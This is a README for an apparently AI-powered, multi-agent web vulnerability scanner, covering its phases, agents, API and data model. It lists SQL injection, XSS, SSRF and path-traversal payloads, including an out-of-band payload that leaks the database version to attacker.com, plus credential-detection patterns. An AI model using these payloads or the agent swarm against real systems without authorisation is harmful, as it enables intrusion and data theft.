# ZerOn Bug Hunter Engine 🕷️

> **The autonomous, AI-powered vulnerability scanning backend for the ZerOn Protocol.**

ZerOn Bug Hunter is a production-grade, multi-agent security scanning engine built on **Node.js + Express**. It implements a **Mixture of Agents (MoA)** architecture — a multi-LLM swarm where 6 specialized AI agents scan a target in parallel, and a two-stage judge (Cerebras → SambaNova DeepSeek-R1) validates every finding before it is reported. This prevents false positives and ensures every vulnerability delivered to the enterprise dashboard is a confirmed true positive.

---

## 📋 Table of Contents

1. [Key Features](#-key-features)
2. [Architecture Overview](#-architecture-overview)
3. [The Five Scanning Phases](#-the-five-scanning-phases)
4. [Mixture of Agents (MoA)](#-mixture-of-agents-moa---the-core-innovation)
5. [AI Models & API Integrations](#-ai-models--api-integrations)
6. [Tech Stack](#-tech-stack)
7. [Installation & Setup](#-installation--setup)
8. [API Reference](#-api-reference)
9. [Real-time WebSocket Events](#-real-time-websocket-events)
10. [Configuration (.env)](#-configuration-env)
11. [Integration with ZerOn Frontend](#-integration-with-zeron-frontend)

---

## ✨ Key Features

| Feature | Description |
|---|---|
| **Mixture of Agents (MoA)** | 6 specialist AI agents (SQLi, XSS, SSRF, Auth, IDOR, Headers) fire in parallel. The Master Agent orchestrates all of them. |
| **Two-Stage AI Judge** | Cerebras `llama3.1-8b` performs fast triage. Ambiguous findings escalate to SambaNova `DeepSeek-R1` for chain-of-thought reasoning. |
| **RAG Memory Store** | A persistent JSON-based RAG memory logs every false positive rejection. Each agent reads this before scanning so it never repeats past mistakes. |
| **Gemini-Powered Pre-Scan Fingerprinting** | Before dispatching agents, Gemini 1.5 Flash analyzes the attack surface and decides which agents to activate — conserving API quota and reducing noise. |
| **SPA Fallback** | If 0 endpoints are found (Single Page Application), the Master Agent automatically injects known API paths to probe. |
| **Type-Aware Routing** | Parameters are routed to the correct agent via regex: `id`, `user`, `password` go to SQLi/Auth; `url`, `redirect`, `src` go to SSRF. |
| **Exponential Backoff** | Each agent runs with an independent backoff wrapper — a single agent failure never crashes the swarm. |
| **Headless Browser Engine** | Puppeteer is used for JavaScript-rendered pages. It crawls React/Vue SPAs that plain HTTP crawlers cannot reach. |
| **5-Phase Scanning Pipeline** | Phase 0 (Recon) → Phase 1 (Discovery) → Phase 2 (Attack Surface) → Phase 3 (Exploitation) → Phase 4 (Reporting). |
| **Real-time WebSocket Streaming** | Every scan event (phase changes, agent updates, findings) is streamed live to the frontend dashboard via Socket.io. |
| **Firebase Integration** | All scan results and user data are persisted to Firebase Firestore for retrieval by the web dashboard. |
| **Web3 Bounty Escrow (Production)** | Integrates an Avalanche C-Chain smart contract to autonomously distribute bug bounties directly to the platform's treasury upon verified finding discovery. Includes a real auto-funding mechanism to ensure payouts never fail. |
| **IPFS Immutable Storage (Real)** | Connects to the Pinata IPFS API to upload and pin vulnerability reports as immutable JSON objects, generating real cryptographic CIDs (Content Identifiers). |
| **PDF Report Generation** | Completed scans generate a downloadable PDF report with CVSS scores, OWASP references, remediation steps, and Proof-of-Concept. |
| **Gemini AI Remediation** | Each confirmed vulnerability gets AI-generated remediation code examples (Node.js, Python, PHP, Java). |

---

## 🏗️ Architecture Overview

ZerOn Bug Hunter implements a **Mixture of Agents (MoA)** — a distributed multi-LLM swarm architecture where the Master Agent orchestrates specialized child agents in parallel.

```text
┌─────────────────────────────────────────────────────────────────────┐
│               ZerOn React Frontend (Enterprise Dashboard)            │
│        WebSocket: Socket.io  ·  REST: POST /api/scan/start           │
└────────────────────────────┬────────────────────────────────────────┘
                             │
┌────────────────────────────▼────────────────────────────────────────┐
│                 Express/Node.js Server (server-simple.js)            │
│  • REST API Routes            • Socket.io Real-time Event Emitter    │
│  • Firebase Persistence       • Scan Job Management (in-memory map)  │
└──┬─────────────────────────────────────────────────────────────┬────┘
   │  5-Phase Pipeline                                            │ Firebase
   │                                                             │ Firestore
┌──▼──────────────────────────────────────────────────────────┐  │
│                   Phase 0: Recon & Scope                     │  │
│  scopeService  ·  subdomainEnum  ·  assetCatalog             │  │
│  targetScorer (AI-assisted prioritization)                   │  │
└──┬──────────────────────────────────────────────────────────┘  │
   │                                                              │
┌──▼──────────────────────────────────────────────────────────┐  │
│                  Phase 1: Discovery                          │  │
│  crawlerService (Axios+Cheerio)  ·  Puppeteer (headless JS)  │  │
│  waybackService  ·  jsFileAnalyzer  ·  fingerprintService    │  │
│  directoryFuzzer  ·  robotsAndSitemapService                 │  │
└──┬──────────────────────────────────────────────────────────┘  │
   │                                                              │
┌──▼──────────────────────────────────────────────────────────┐  │
│               Phase 2: Attack Surface Analysis               │  │
│  parameterDiscovery  ·  payloadGenerator                     │  │
│  vulnerabilityTemplates                                      │  │
└──┬──────────────────────────────────────────────────────────┘  │
   │                                                              │
┌──▼──────────────────────────────────────────────────────────┐  │
│    Phase 3: Exploitation — Mixture of Agents (MoA) Swarm     │  │
│                                                              │  │
│  ┌─────────────────────────────────────────────────────┐    │  │
│  │              Master Agent (Gemini 1.5 Flash)         │    │  │
│  │  1. Pre-scan fingerprint → decide which agents run   │    │  │
│  │  2. Type-aware routing (SQLi/XSS/SSRF/Auth/IDOR)     │    │  │
│  │  3. Promise.allSettled() — parallel dispatch         │    │  │
│  │  4. Deduplicate raw findings                         │    │  │
│  │  5. Two-Stage Judge (Cerebras → SambaNova)           │    │  │
│  │  6. RAG Memory — log false positives                 │    │  │
│  └─────────────────────────────────────────────────────┘    │  │
│          │              │            │        │       │       │  │
│  ┌───────▼──┐  ┌────────▼─┐  ┌──────▼──┐  ┌─▼────┐ ┌▼────┐ │  │
│  │SQLi Agent│  │XSS Agent │  │SSRFAgent│  │Auth  │ │IDOR │ │  │
│  │(NVIDIA   │  │(Groq     │  │(Cohere  │  │Agent │ │Agent│ │  │
│  │Llama 70B)│  │Llama 70B)│  │Cmd-R)   │  │Mistr.│ │Groq │ │  │
│  └──────────┘  └──────────┘  └─────────┘  └──────┘ └─────┘ │  │
│          └───────────────────┬──────────────────────────────┘  │  │
│                              │ + Header Agent (Rule-Based)       │  │
│  ┌────────────────────────────▼──────────────────────────────┐  │  │
│  │  Two-Stage Judge                                          │  │  │
│  │  Stage 1: Cerebras llama3.1-8b   (fast triage)           │  │  │
│  │  Stage 2: SambaNova DeepSeek-R1  (chain-of-thought)       │  │  │
│  └───────────────────────────────────────────────────────────┘  │  │
└──┬──────────────────────────────────────────────────────────────┘  │
   │                                                                   │
┌──▼──────────────────────────────────────────────────────────┐  ◄───┘
│                    Phase 4: Reporting                        │
│  reportGenerator  ·  bugBountyReportService                  │
│  pdfReportService ·  deduplicationEngine                     │
│  Gemini AI Remediation (code examples in 4 languages)        │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔬 The Five Scanning Phases

### Phase 0 — Recon & Scope (`services/Phase0/`)

The first phase defines the target boundary and discovers assets before any active scanning.

| Service | Purpose |
|---|---|
| `scopeService.js` | Defines in-scope vs. out-of-scope domains. Prevents accidental scanning of third-party services. |
| `subdomainEnum.js` | Enumerates subdomains using DNS brute-forcing and pattern extrapolation. Expands the attack surface beyond the base domain. |
| `assetCatalog.js` | Catalogues all discovered assets (IPs, subdomains, URLs) into a structured object for downstream phases. |
| `targetScorer.js` | Uses AI to score discovered targets by exploitability likelihood, allowing high-value targets to be prioritized. |

---

### Phase 1 — Discovery (`services/Phase1/`)

The most comprehensive phase — maps every URL, endpoint, parameter, and technology stack fingerprint.

| Service | Purpose |
|---|---|
| `crawlerService.js` | Recursive HTTP crawler (Axios + Cheerio). Visits up to 1000 pages to depth 3. Supports session cookies for authenticated crawling. |
| `fingerprintService.js` | Detects server technology, CMS, frameworks, and headers. Identifies the tech stack to inform payload selection. |
| `waybackService.js` | Queries the Wayback Machine (web.archive.org) to find historical URLs — often containing old, unpatched endpoints. |
| `jsFileAnalyzer.js` | Parses JavaScript bundles to extract hidden API endpoints, hardcoded keys, and internal route definitions. |
| `robotsAndSitemapService.js` | Parses `robots.txt` and `sitemap.xml` to find paths that developers have explicitly tried to hide from crawlers. |
| `directoryFuzzer.js` | Fuzzes common directory and file paths (e.g., `/admin`, `/backup`, `/.env`) to find exposed resources. |
| `apiDiscoveryService.js` | Detects REST/GraphQL API patterns from crawled responses and extracts all parameterized endpoints. |
| `staticAnalysisService.js` | Performs static analysis on page source to detect inline secrets, dangerous JavaScript patterns, and misconfigurations. |

---

### Phase 2 — Attack Surface Analysis (`services/Phase2/`)

Transforms the raw endpoint list into a structured attack surface map with parameterized vectors and context-aware payloads.

| Service | Purpose |
|---|---|
| `parameterDiscovery.js` | Extracts every GET, POST, cookie, and header parameter from the crawled endpoints. |
| `payloadGenerator.js` | Generates context-aware payloads for each parameter based on its name and expected type. |
| `vulnerabilityTemplates.js` | A comprehensive library of vulnerability patterns (SQLi, XSS, SSRF, IDOR, etc.) used to map parameters to test templates. |

---

### Phase 3 — Exploitation (`services/Phase3/` + `services/agents/`)

The exploitation phase uses the **Mixture of Agents (MoA)** architecture — the most technically significant part of the system.

#### Standard Exploitation Services

| Service | Purpose |
|---|---|
| `exploitationEngine.js` | Core HTTP execution engine. Sends test payloads and captures raw responses. |
| `validatorEngine.js` | Deterministic rule-based validator that auto-confirms header/redirect findings without LLM cost. |
| `responseAnalyzer.js` | Parses HTTP responses for SQL error signatures, XSS reflection, redirect chains, and internal IP disclosures. |
| `severityCalculator.js` | Calculates CVSS scores and severity ratings (Critical/High/Medium/Low) based on vulnerability type and context. |
| `pocGenerator.js` | Generates a ready-to-use Proof-of-Concept (PoC) for each confirmed vulnerability — including the exact payload, request, and response evidence. |
| `headlessBrowser.js` | Puppeteer-based headless Chrome instance for crawling JavaScript-heavy SPAs and performing visual XSS verification. |
| `advancedExploitationService.js` | Real bug-bounty techniques: **Boolean-based Blind SQLi, Time-based Blind SQLi (SLEEP), UNION-based SQLi with column detection, Context-aware XSS, Out-of-Band injection, IDOR horizontal privilege escalation, Information Disclosure, RCE.** |

---

## 🤖 Mixture of Agents (MoA) — The Core Innovation

The `services/agents/` directory contains the multi-LLM swarm. The **Master Agent** (`masterAgent.js`) implements a **5-step orchestration protocol**:

### Step 1: Gemini Pre-Scan Fingerprinting
Before a single probe is sent, Gemini 1.5 Flash analyzes the list of discovered parameter names and endpoint paths and decides: *"Should I run the SQLi agent? The XSS agent? The SSRF agent?"* This avoids wasting API quota testing SQL injection on a URL parameter with no query string.

### Step 2: Type-Aware Regex Routing
Each parameter is routed to the correct specialist based on its name:
- `id`, `user`, `email`, `password`, `search` → **SQLi Agent**
- `query`, `search`, `msg`, `comment`, `input` → **XSS Agent**
- `url`, `redirect`, `src`, `dest`, `callback` → **SSRF Agent**
- Login/auth endpoints → **Auth Agent**
- Numeric ID parameters → **IDOR Agent**
- All endpoints → **Header Agent** (always runs)

### Step 3: Parallel Swarm Dispatch (`Promise.allSettled`)
All 6 agents fire simultaneously. A per-agent timeout (10-12 seconds) ensures a slow agent does not block the pipeline. Exponential backoff with 1 retry is applied to each agent independently.

### Step 4: Two-Stage AI Judge (False Positive Elimination)
All raw findings from the swarm are passed to a two-stage judge:
- **Stage 1 — Cerebras `llama3.1-8b`**: Ultra-fast inference. Reviews the payload + HTTP response evidence and outputs a structured verdict: `"Confirmed True Positive"` / `"Likely False Positive"` / `"Needs Manual Review"`. Rule-based findings (headers, open redirects with HTTP 3xx proof) are auto-confirmed without LLM overhead.
- **Stage 2 — SambaNova `DeepSeek-R1`**: Only invoked for ambiguous findings. Uses chain-of-thought reasoning to perform a deeper analysis and issue a final verdict.

### Step 5: RAG Memory — Persistent Learning
Every rejected false positive is logged to `config/rag-memory.json` with the vulnerability type, payload pattern, and rejection reason. Before each new scan, every agent reads the last 5 relevant lessons from this store. This prevents the system from making the same mistake twice across multiple scans.

### The 6 Specialist Agents

| Agent | LLM Provider | Vulnerability Class |
|---|---|---|
| **SqliAgent** | NVIDIA Llama 3.1 70B | SQL Injection (Error-based, Blind Boolean, Time-based, UNION) |
| **XssAgent** | Groq Llama 3.3 70B | Reflected XSS (Context-aware: HTML, attribute, script contexts) |
| **SSRFAgent** | Cohere Command-R | SSRF (AWS/GCP/Azure metadata) & Open Redirect |
| **AuthAgent** | Mistral | Broken Authentication (A07:2021) |
| **IdorAgent** | Groq + Cloudflare Fallback | Broken Access Control / IDOR (A01:2021) |
| **HeaderAgent** | Rule-Based (No LLM) | Security Misconfigurations — HSTS, CSP, X-Frame-Options, CORS |

---

### Phase 4 — Reporting (`services/Phase4/`)

| Service | Purpose |
|---|---|
| `reportGenerator.js` | Generates a structured vulnerability report in JSON. Each finding includes type, severity, CVSS score, OWASP category, payload, proof, and AI-generated remediation. |
| `ipfsService.js` | Authenticates with the Pinata API using a JWT to pin the JSON report to the real InterPlanetary File System (IPFS), generating a permanent `ipfsHash` (CID). |
| `escrowService.js` | Acts as a Web3 Oracle. Connects to the Avalanche Fuji testnet using `ethers.js`, auto-funds the `BountyEscrow` smart contract if empty, and triggers real, verifiable blockchain payouts. |
| `bugBountyReportService.js` | Formats reports in Bug Bounty platform format (HackerOne, Bugcrowd) — with CVSS vector strings and executive summary. |
| `pdfReportService.js` | Generates a downloadable PDF report from the JSON findings. The frontend downloads this via `GET /api/scan/:id/report.pdf`. |
| `deduplicationEngine.js` | Final deduplication pass to eliminate any remaining duplicate findings before the report is saved to Firebase. |

---

## 🤖 AI Models & API Integrations

| Provider | Model | Role | API Key Env Var |
|---|---|---|---|
| **Google Gemini** | `gemini-1.5-flash` | Master Agent fingerprinting + AI remediation generation | `GEMINI_API_KEY` |
| **NVIDIA NIM** | `meta/llama-3.1-70b-instruct` | SQLi specialist agent | `NVIDIA_API_KEY` |
| **Groq** | `llama-3.3-70b-versatile` | XSS specialist agent + IDOR verification | `GROQ_API_KEY` |
| **Cohere** | `command-r` | SSRF & Open Redirect specialist agent | `COHERE_API_KEY` |
| **Mistral** | `mistral-large-latest` | Auth Failures (A07) specialist agent | `MISTRAL_API_KEY` |
| **Cerebras** | `llama3.1-8b` | Stage 1 judge — fast triage of all raw findings | `CEREBRAS_API_KEY` |
| **SambaNova** | `DeepSeek-R1` | Stage 2 judge — chain-of-thought deep reasoning for ambiguous findings | `SAMBANOVA_API_KEY` |
| **Cloudflare Workers AI** | Fallback model | Emergency fallback when primary agent APIs are unavailable | `CLOUDFLARE_API_KEY`, `CLOUDFLARE_ACCOUNT_ID` |

---

## 🛠️ Tech Stack

| Category | Technology |
|---|---|
| **Runtime** | Node.js 18+ |
| **Web Framework** | Express.js 4.x |
| **Real-time** | Socket.io 4.x |
| **Headless Browser** | Puppeteer 21.x (Chromium) |
| **HTTP Client** | Axios 1.x |
| **HTML Parser** | Cheerio 1.x |
| **AI SDK** | `@google/generative-ai` SDK + native `fetch()` for all other LLMs |
| **Database** | Firebase Firestore (via `firebase-admin`) |
| **Authentication** | Firebase Auth + JSON Web Tokens |
| **Hashing** | bcryptjs |
| **Logging** | Winston |
| **Process Management** | Nodemon (dev), Node.js (prod) |
| **Testing** | Jest + Supertest |

---

## 🚀 Installation & Setup

### Prerequisites
- Node.js v18+
- Google Chrome (required by Puppeteer)
- Firebase Project with Firestore enabled

### 1. Clone the Repository
```bash
git clone https://github.com/your-org/ZerOn-Bug-Hunter.git
cd ZerOn-Bug-Hunter
```

### 2. Install Dependencies
```bash
npm install
```

### 3. Configure Environment Variables
Copy the example environment and fill in your API keys:
```bash
cp .env.example .env
```
Edit `.env` with your keys (see [Configuration](#-configuration-env) section below).

### 4. Configure Firebase
Place your Firebase Admin SDK credentials in `config/firebase-credentials.json`.

### 5. Start the Dev Server
```bash
npm run dev
```
The server starts on `http://localhost:5000`.

### 6. Run Tests
```bash
# Test all API integrations
node test-all-apis.js

# Test the full scanning pipeline on a target
node pipeline-test.js

# Validate all agents are operational
node validate-agents.js
```

---

## 📡 API Reference

### `POST /api/scan/start`
Initiates a new vulnerability scan. This is the primary endpoint called by the frontend dashboard.

**Request Body:**
```json
{
  "domain": "http://testfire.net",
  "userId": "firebase-uid-or-dev-bypass",
  "sessionCookie": "optional; PHPSESSID=abc123"
}
```

**Response:**
```json
{
  "success": true,
  "scanId": "uuid-v4-scan-id",
  "message": "Scan initiated",
  "domain": "http://testfire.net"
}
```

---

### `GET /api/scan/:scanId/status`
Retrieves the real-time status and results of an ongoing or completed scan.

**Response:**
```json
{
  "scanId": "uuid",
  "status": "completed",
  "domain": "http://testfire.net",
  "currentPhase": "Phase 4: Reporting",
  "progress": 100,
  "findings": [
    {
      "type": "SQL Injection",
      "severity": "High",
      "cvss": 8.6,
      "endpoint": "http://testfire.net/search",
      "parameter": "query",
      "payload": "' OR '1'='1",
      "proof": "SQL error: You have an error in your SQL syntax...",
      "owasp": "A03:2021 – Injection",
      "remediation": "Use parameterized queries / prepared statements.",
      "confidence": 95
    }
  ]
}
```

---

### `GET /api/scan/:scanId/report.pdf`
Streams the generated PDF report for download.

---

### `GET /api/scan/history/:userId`
Returns all historical scan results for a given Firebase User ID.

---

### `POST /api/remediation`
Generates AI-powered remediation advice for a specific vulnerability using Gemini.

**Request Body:**
```json
{
  "type": "SQL Injection",
  "endpoint": "http://example.com/search",
  "parameter": "q",
  "severity": "High"
}
```

---

## 📡 Real-time WebSocket Events

Connect to the Socket.io server at `http://localhost:5000`. Listen for the following events during an active scan:

| Event | Payload | Description |
|---|---|---|
| `progress_{scanId}` | `{ phase, status, progress, findings }` | General phase progress update (0-100%) |
| `agent:update` | `{ scanId, agent, status, vectors, findings }` | Individual agent status updates |
| `agent:benchmark` | `{ rawFindings, falsePositivesRemoved, confirmedFindings, rawPrecision }` | Post-swarm benchmarking metrics |
| `scan:complete` | `{ scanId, findings, summary }` | Final scan completion event with all results |
| `scan:error` | `{ scanId, error }` | Scan failure event |

---

## ⚙️ Configuration (.env)

```env
# Server
PORT=5000

# Google Gemini — Master Agent Fingerprinting & AI Remediation
GEMINI_API_KEY=your_gemini_api_key

# NVIDIA NIM — SQLi Agent
NVIDIA_API_KEY=your_nvidia_nim_api_key

# Groq — XSS Agent & IDOR Agent
GROQ_API_KEY=your_groq_api_key

# Cohere — SSRF & Open Redirect Agent
COHERE_API_KEY=your_cohere_api_key

# Mistral — Auth Failures Agent
MISTRAL_API_KEY=your_mistral_api_key

# Cerebras — Stage 1 Judge (Fast Triage)
CEREBRAS_API_KEY=your_cerebras_api_key

# SambaNova — Stage 2 Judge (DeepSeek-R1 Chain-of-Thought)
SAMBANOVA_API_KEY=your_sambanova_api_key

# Cloudflare Workers AI — Emergency Fallback
CLOUDFLARE_API_KEY=your_cloudflare_api_key
CLOUDFLARE_ACCOUNT_ID=your_cloudflare_account_id

# Firebase Admin SDK (path to credentials JSON)
FIREBASE_PROJECT_ID=your_firebase_project_id
```

---

## 🔗 Integration with ZerOn Frontend

The ZerOn Bug Hunter backend is the scanning engine for the [ZerOn Main Platform](https://github.com/your-org/ZerOn-main) (React + Vite). Here is how they communicate:

1. **Enterprise Auth Flow**: The user completes **Web3 Biometric Face Scanning** (KYC + Sybil Resistance) on the frontend.
   - **AES-256 Encryption**: Biometric descriptors are AES-256 encrypted at rest in Firestore. The backend decrypts them in-memory to compute Euclidean distance.
   - **Rate Limiting**: The `/api/face/verify` endpoint is protected by an IP-based rate limiter (max 5 attempts per 15 minutes) to prevent brute-force attacks on the 3-zone confidence threshold.

2. **Session Security (`requireBiometric`)**: Upon successful biometric match, the backend issues a **JWT Token** containing a `biometricVerified: true` claim. This token must be passed in the `Authorization` header for all sensitive endpoints.

3. **Scan Initiation**: The frontend's "Deploy Autonomous Agent" button (`NewScan.jsx`) calls `POST /api/scan/start` with the user's `domain` and the biometric JWT token.

4. **Live Terminal Streaming**: The frontend opens a Socket.io connection and subscribes to `progress_{scanId}` and `agent:update` events. These power the live terminal log display and progress bar in the dashboard.

5. **Results Persistence**: When the scan completes, all findings are written to Firebase Firestore at `users/{userId}/scans/{scanId}`. The frontend reads this collection to display past results.

6. **PDF Download**: When the user clicks "Download PDF Report", the frontend opens `GET /api/scan/{scanId}/report.pdf` in a new tab.

---

## 🗺️ Vulnerability Coverage

The following OWASP Top 10 (2021) categories are actively tested:

| OWASP Category | Coverage | Method |
|---|---|---|
| A01: Broken Access Control | ✅ IDOR / Horizontal Escalation | IDOR Agent (Groq) |
| A02: Cryptographic Failures | ✅ Missing HTTPS / HSTS | Header Agent (Rule-based) |
| A03: Injection (SQLi) | ✅ Error, Boolean-Blind, Time-Blind, UNION | SQLi Agent (NVIDIA) |
| A03: Injection (XSS) | ✅ Reflected XSS, Context-Aware | XSS Agent (Groq) |
| A05: Security Misconfiguration | ✅ 8+ security headers checked | Header Agent (Rule-based) |
| A07: Auth Failures | ✅ Default creds, weak auth | Auth Agent (Mistral) |
| A09: SSRF | ✅ AWS/GCP/Azure metadata | SSRF Agent (Cohere) |
| Open Redirect | ✅ HTTP 3xx Location header | SSRF Agent (Cohere) |
| Information Disclosure | ✅ Path traversal, config exposure | Advanced Exploitation Service |
| RCE / Command Injection | ✅ Unix/Windows shell payloads | Advanced Exploitation Service |

---

## 🕵️ Advanced Exploitation Techniques (Phase 3 Deep Dive)

The `advancedExploitationService.js` implements real bug-bounty-grade attack techniques. These are the exact same techniques used in professional penetration tests:

### SQL Injection Variants

| Technique | Method | Detection Signal |
|---|---|---|
| **Error-Based SQLi** | Injects `'`, `''`, `' OR '1`, `extractvalue()`, `updatexml()` | SQL error regex matches: `You have an error in your SQL syntax`, `ORA-XXXXX`, `pg_query()` |
| **Boolean-Based Blind SQLi** | Injects `1' AND '1'='1` (TRUE) vs `1' AND '1'='2` (FALSE) | Response length difference > 100 bytes between TRUE/FALSE condition |
| **Time-Based Blind SQLi** | Injects `1' AND SLEEP(5)--`, `WAITFOR DELAY '00:00:05'--` (MSSQL) | Response time ≥ 4500ms vs baseline < 2000ms |
| **UNION-Based SQLi** | Uses `ORDER BY N--` to detect column count, then `UNION SELECT NULL,NULL...--` | No error on UNION + optional version extraction |
| **OOB SQLi** | DNS-based via `LOAD_FILE(CONCAT('\\\\', version(), '.attacker.com'))` | Payload accepted without immediate error (requires manual DNS callback verification) |

### XSS Detection (Context-Aware)

1. **Marker Injection** — A unique token `ZER0N_XSS_{random}` is injected first to confirm reflection
2. **Context Detection** — Response is parsed to identify if the marker appears in:
   - `value="..."` attribute → **attribute context**
   - Inside a `<tag>` → **tag context**
   - Inside `<script>` block → **script context**
   - Bare HTML → **HTML context**
3. **Context-Specific Payloads** — Different payload sets are used per context:
   - Attribute: `" onload="alert(1)"`, `" autofocus onfocus="alert(1)"`
   - Script: `';alert(1);//`, `</script><script>alert(1)</script>`
   - HTML: `<script>alert(1)</script>`, `<svg onload=alert(1)>`, `<iframe src="javascript:alert(1)">`
4. **Blind XSS Fallback** — If the marker is not reflected, common payloads are tried directly

### SSRF Targets Probed

```
http://127.0.0.1/                          ← Localhost
http://169.254.169.254/latest/meta-data/   ← AWS EC2 metadata
http://metadata.google.internal/computeMetadata/v1/ ← GCP metadata
http://169.254.169.254/metadata/instance   ← Azure metadata
http://0.0.0.0/                            ← Null route
http://[::1]/                              ← IPv6 localhost
dict://127.0.0.1:6379/                     ← Redis
file:///etc/passwd                         ← Local file read
```

### IDOR Detection Algorithm

1. Finds parameters matching `/id|user|account|order|profile|doc/i`
2. Extracts the numeric value from the URL (e.g., `?id=42`)
3. Tests IDs: `[42, 43, 44]` via separate HTTP GET requests
4. If `≥ 2` requests return HTTP 200, sends the response bodies to **Groq Llama 70B** for analysis
5. Groq confirms IDOR if the responses contain structurally different user data (not just 404 pages)

### Information Disclosure Paths Tested

```
../../../etc/passwd        Windows: ..\..\..\windows\system.ini
/etc/passwd                C:\windows\system.ini
../config.php              ../wp-config.php
.env                       config.json
phpinfo.php                info.php
/proc/self/environ         ../app/config/database.yml
```

**Sensitive Patterns Detected:**
- `root:.*:0:0:` → Unix passwd file (confidence 95%)
- `aws_access_key|aws_secret` → AWS credentials (confidence 95%)
- `BEGIN.*PRIVATE KEY` → Private key (confidence 95%)
- `stack trace|exception at line` → Error with stack trace (confidence 80%)
- `Index of /|Parent Directory` → Directory listing (confidence 85%)

---

## 🌐 Subdomain Enumeration (Phase 0 Detail)

`subdomainEnum.js` uses three parallel methods:

### Method 1: DNS Brute-Force
Resolves `A` records for 80+ common prefixes against the target domain:
```
www, mail, api, admin, dev, staging, test, beta, alpha,
cdn, img, static, assets, ftp, vpn, portal, app, blog,
shop, store, jenkins, gitlab, dashboard, db, redis, cache,
backup, archive, internal, partner, client, secure, ssl
```

### Method 2: Certificate Transparency Logs
Queries `https://crt.sh/?q=%.{domain}&output=json` — the public CT log API that reveals every SSL certificate ever issued for the domain, exposing historically deployed subdomains that may no longer be advertised.

### Method 3: Common Subdomain Construction
Directly constructs a list of the 80 common prefixes above to supplement DNS brute-force.

All discovered subdomains are deduplicated via a `Set` and live-verified with `dns.resolve4()`.

---

## 🗄️ Firebase Data Model (Backend)

The backend writes to the following Firestore collections:

### `scans/{scanId}`
```json
{
  "scanId": "uuid-v4",
  "userId": "user-uuid",
  "domain": "http://testphp.vulnweb.com",
  "status": "completed",
  "progress": 100,
  "currentPhase": "Phase 4: Reporting",
  "createdAt": "2025-06-01T10:00:00Z",
  "completedAt": "2025-06-01T10:05:00Z",
  "findings": [
    {
      "type": "SQL Injection",
      "severity": "High",
      "cvss": 8.6,
      "cwe": "CWE-89",
      "owasp": "A03:2021 – Injection",
      "endpoint": "http://testphp.vulnweb.com/artists.php",
      "parameter": "artist",
      "payload": "' OR '1'='1",
      "proof": "You have an error in your SQL syntax...",
      "remediation": "Use parameterized queries / prepared statements.",
      "confidence": 95
    }
  ],
  "summary": {
    "totalFindings": 7,
    "critical": 1,
    "high": 3,
    "medium": 2,
    "low": 1
  }
}
```

### `users/{userId}` (backend-maintained)
```json
{
  "userId": "user-uuid",
  "plan": { "type": "pro", "domains": 3, "domainsUsed": 1 },
  "walletAddress": "0xabc...123",
  "transactionHash": "0x8f2a..."
}
```

---

## 🧪 Test Scripts

The repository includes several test scripts for validating individual components:

| Script | Command | Purpose |
|---|---|---|
| `test-all-apis.js` | `node test-all-apis.js` | Validates all 7 LLM API keys are functional (Gemini, NVIDIA, Groq, Cohere, Mistral, Cerebras, SambaNova) |
| `pipeline-test.js` | `node pipeline-test.js` | Runs a complete end-to-end scan against a test target (`testphp.vulnweb.com`) and prints all findings |
| `validate-agents.js` | `node validate-agents.js` | Instantiates each of the 6 specialist agents and verifies they initialize without errors |
| `test-scan.js` | `node test-scan.js` | Unit test for the core scan flow — phases 0 through 4 |
| `test-crawler.js` | `node test-crawler.js` | Tests `crawlerService.js` against a known target |
| `test-deduplication.js` | `node test-deduplication.js` | Verifies the deduplication engine correctly collapses duplicate findings |
| `test-new-vulnerabilities.js` | `node test-new-vulnerabilities.js` | Tests the advanced exploitation service for new vuln types (IDOR, InfoDisclosure, RCE) |
| `test-info-disclosure.js` | `node test-info-disclosure.js` | Targeted test for information disclosure path traversal detection |
| `test-phase2.js` | `node test-phase2.js` | Tests parameter discovery and payload generation (Phase 2) |
| `test-phase3.js` | `node test-phase3.js` | Tests the MoA agent swarm (Phase 3) in isolation |
| `cleanup.js` | `node cleanup.js` | Clears stale scan logs and temp files from the `logs/` directory |

---

## 📊 Complete Scan Lifecycle Walkthrough

Here is the exact execution order from `POST /api/scan/start` to final Firebase write:

```
POST /api/scan/start
  │
  ├─ 1. Generate scanId (uuid-v4)
  ├─ 2. Save initial scan record to Firebase: status="started"
  ├─ 3. Emit Socket.io: "Scan initiated"
  │
  ├─ PHASE 0: RECON & SCOPE (0-15%)
  │   ├─ ScopeService.parseScope(domain)
  │   ├─ SubdomainEnumerator.enumerateSubdomains(domain)
  │   │   ├─ DNS Brute-force (80 prefixes)
  │   │   ├─ Certificate Transparency logs (crt.sh API)
  │   │   └─ Common subdomain construction
  │   ├─ AssetCatalog.buildCatalog(subdomains)
  │   └─ TargetScorer.scoreTargets(assets) → prioritize by exploitability
  │
  ├─ PHASE 1: DISCOVERY (15-35%)
  │   ├─ CrawlerService.crawl(domain, {maxDepth:3, maxPages:1000})
  │   │   └─ Recursive Axios+Cheerio HTTP crawler
  │   ├─ WaybackService.queryWayback(domain) → historical URLs
  │   ├─ JSFileAnalyzer.analyzeJSFiles(endpoints) → extract hidden APIs
  │   ├─ RobotsAndSitemapService.parse(domain) → robots.txt + sitemap.xml
  │   ├─ DirectoryFuzzer.fuzz(domain) → common paths (/admin, /.env, etc.)
  │   ├─ FingerprintService.fingerprint(domain) → tech stack detection
  │   └─ ApiDiscoveryService.discoverAPIs(endpoints)
  │
  ├─ PHASE 2: ATTACK SURFACE ANALYSIS (35-55%)
  │   ├─ ParameterDiscovery.extractParameters(endpoints)
  │   ├─ PayloadGenerator.generatePayloads(parameters)
  │   └─ VulnerabilityTemplates.mapToTemplates(parameters)
  │
  ├─ PHASE 3: EXPLOITATION — MoA SWARM (55-90%)
  │   ├─ MasterAgent.fingerprint(domain, attackSurface) — Gemini decides which agents run
  │   ├─ Type-aware routing → sqliVectors, xssVectors, ssrfVectors, authVectors, idorVectors
  │   ├─ Promise.allSettled([SQLi, XSS, Headers, Auth, IDOR, (SSRF if applicable)])
  │   │   ├─ SqliAgent  (NVIDIA Llama 70B) — error/blind/UNION/time-based
  │   │   ├─ XssAgent   (Groq Llama 70B)   — context-aware reflected XSS
  │   │   ├─ SSRFAgent  (Cohere Cmd-R)     — SSRF + open redirect
  │   │   ├─ AuthAgent  (Mistral)           — auth failures A07
  │   │   ├─ IdorAgent  (Groq + Cloudflare) — horizontal privilege escalation
  │   │   └─ HeaderAgent (Rule-based)       — 8 security headers checked
  │   ├─ Deduplicate raw findings (by type + endpoint)
  │   ├─ Two-Stage Judge:
  │   │   ├─ Stage 1: Cerebras llama3.1-8b → Confirmed / False Positive / Needs Review
